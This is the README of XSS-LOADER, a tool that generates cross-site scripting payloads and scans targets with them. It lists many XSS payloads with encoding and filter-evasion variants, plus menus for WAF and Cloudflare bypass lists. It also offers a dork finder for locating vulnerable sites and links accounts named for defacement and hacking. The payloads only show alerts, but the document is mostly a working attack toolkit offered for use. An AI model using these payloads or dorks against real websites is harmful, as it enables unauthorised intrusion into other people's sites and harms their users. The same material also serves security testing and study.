![logo](https://i.postimg.cc/85rb4cYK/20200621-175301.png) 

## Screenshot 
![Screenshot](https://i.postimg.cc/NBhz23wS/Screenshot-20200501-014953-Termux.jpg) 

## 📒 Read Me 📒

* This tool creates payload for use in xss injection
* Select default payload tags from parameter or  write your payload
* It makes xss inj. with Xss Scanner parameter
* It finds vulnerable sites url with Xss Dork Finder parameter

##  :cd: Installation  :cd:
### Installation with requirements.txt

```bash
git clone https://github.com/capture0x/XSS-LOADER/
cd XSS-LOADER
pip3 install -r requirements.txt
```

## Usage

```bash
python3 payloader.py
```

## 🗃️  Features  🗃️

#### *Basic Payload

Sets default parameter to :```<script>alert(1)</script>```

#### *Div Payload

Sets default parameter to :```<div onpointerover='alert(1)'>MOVE HERE</div```

#### *Img Payload

Sets default parameter to :```<img src=x onerror=alert('1');>```

#### *Body Payload

Sets default parameter to :```<body ontouchstart=alert(1)>```

#### *Svg Payload

Sets default parameter to :```<svg onload=alert('1')>```

#### *Enter Your Payload

Encodes payload writed by user

#### *Payload Generator Parameter

Encodes payload on selected tag

#
```
* |   1.  UPPER CASE---->  <SCRIPT>ALERT(1)</SCRIPT>              
* |   2.  UPPER AND LOWER CASE----> <ScRiPt>aleRt(1)</ScRiPt>   
* |   3.  URL ENCODE ----->   %3Cscript%3Ealert%281%29%3C%2Fscript%3E           
* |   4.  HTML ENTITY ENCODE----->  &lt;script&gt;alert(1)&lt;/script&gt; 
* |   5.  SPLIT PAYLOAD ----->  <scri</script>pt>>alert(1)</scri</script>pt>>       
* |   6.  HEX ENCODE ----->  3c7363726970743e616c6572742831293c2f7363726970743e       
* |   7.  UTF-16 ENCODE -----> Encode payload to utf-16 format.   
* |   8.  UTF-32 ENCODE----->  Encode payload to utf-32 format.          
* |   9.  DELETE TAG -----> ";alert('XSS');//            
* |  10.  UNICODE ENCODE----->    %uff1cscript%uff1ealert(1)%uff1c/script%uff1e         
* |  11.  US-ASCII ENCODE ----->  ¼script¾alert(1)¼/script¾      
* |  12.  BASE64 ENCODE ----->   PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==          
* |  13.  UTF-7 ENCODE ----->   +ADw-script+AD4-alert(1)+ADw-/script+AD4-           
* |  14.  PARENTHESIS BYPASS ----->  <script>alert`1`</script>   
* |  15.  UTF-8 ENCODE ----->  %C0%BCscript%C0%BEalert%CA%B91)%C0%BC/script%C0%BE          
* |  16.  TAG BLOCK BREAKOUT-----> "><script>alert(1)</script>
* |  17.  SCRIPT BREAKOUT----->  </script><script>alert(1)</script>
* |  18.  FILE UPLOAD PAYLOAD-----> "><script>alert(1)</script>.gif
* |  19.  INSIDE COMMENTS BYPASS-----> <!--><script>alert(1)</script>-->
* |  20.  MUTATION PAYLOAD-----> <noscript><p title="</noscript><script>alert(1)</script>">
* |  21.  MALFORMED IMG-----> <IMG """><script>alert(1)</script>">
* |  22.  SPACE BYPASS-----> <img^Lsrc=x^Lonerror=alert('1');>
* |  23.  DOWNLEVEL-HIDDEN BLOCK-----> <!--[if gte IE 4]><script>alert(1)</script><![endif]-->
* |  24.  WAF BYPASS PAYLOADS-----> Show Waf Bypass Payload List
* |  25.  CLOUDFLARE BYPASS PAYLOADS-----> Show Cloudflare Bypass Payload List
* |  26.  POLYGLOT PAYLOADS-----> Show Polyglot Bypass Payload List
* |  27.  ALERT PAYLOADS-----> Show Alert Payload List
* |  28.  ALL CREATE PAYLOAD-----> Show Create All Payloads
* |  29.  GO BACK MAIN MENU
* |  30.  EXIT
```

#### *Xss Scanner

Initially you'll need to enter url of target
Please enter the url like this example==>e.g target -----> http://target.com/index.php?name=
Selected for scanning payload list

* BASIC PAYLOAD LIST   ==> Payload list consisting of script tag
* DIV PAYLOAD LIST     ==> Payload list consisting of div tag
* IMG PAYLOAD LIST     ==> Payload list consisting of img tag
* BODY PAYLOAD LIST    ==> Payload list consisting of body tag
* SVG PAYLOAD LIST     ==> Payload list consisting of svg tag
* MIXED PAYLOAD LIST   ==> Payload list consisting of all tag
* ENTER FILE PATH      ==> Payload list determined by the user ,Please enter the url like this example..!
(e.g. path -----> /usr/share/wordlists/wfuzz/Injections/XSS.txt)

Results will be added in "vulnpayload.txt" after scanning.

#### *Xss Dork Finder

First enter the dork for searching:
   e.g---->inurl:"search.php?q="
Results will be saved in "dork.txt" after scanning.

## Known Issues

### Fixed:
- Unicode errors

- Module errors

### My Accounts
* [TELEGRAM](https://t.me/DefacErr)
* [FACEBOOK](https://www.facebook.com/termuxxhacking)
* [INSTAGRAM](https://instagram.com/termux_hacking)

[![Build-passing](https://img.shields.io/badge/build-passing-red.svg?style=plastic)](https://github.com/Err0r-ICA/SpeedTest/issues) [![Stars](https://img.shields.io/open-vsx/stars/Redhat/Java.svg?style=plastic&color=orange)](https://github.com/Err0r-ICA/SpeedTest/issues) [![Coverage](https://img.shields.io/azure-devops/coverage/Swellaby/Opensource/25?color=yellow&style=plastic)](https://github.com/Err0r-ICA/SpeedTest/issues)

[![Maintainers](https://img.shields.io/badge/mainteiners-HackBoyz-green.svg?style=plastic)](https://github.com/Err0r-ICA/SpeedTest/issues) [![coded](https://img.shields.io/badge/coded%20in-python2.7-mintgreen.svg?style=plastic)](https://github.com/Err0r-ICA/SpeedTest/issues)

[![Status](https://img.shields.io/badge/code%20status-encrypted-cyan.svg?style=plastic)](https://github.com/Err0r-ICA/SpeedTest/issues) [![License](https://img.shields.io/badge/license-MIT-blueviolet.svg?style=plastic)](https://github.com/Err0r-ICA/SpeedTest/issues)

[![Test](https://img.shields.io/badge/tested%20on-Termux,%20Kali%20Linux,%20Ubuntu,%20Parrot%20OS,%20Debian,%20ANDRAX%20Mobile-%23ff69b4.svg?style=plastic)](https://github.com/Err0r-ICA/SpeedTest/issues)
 

**Copyright 2020**
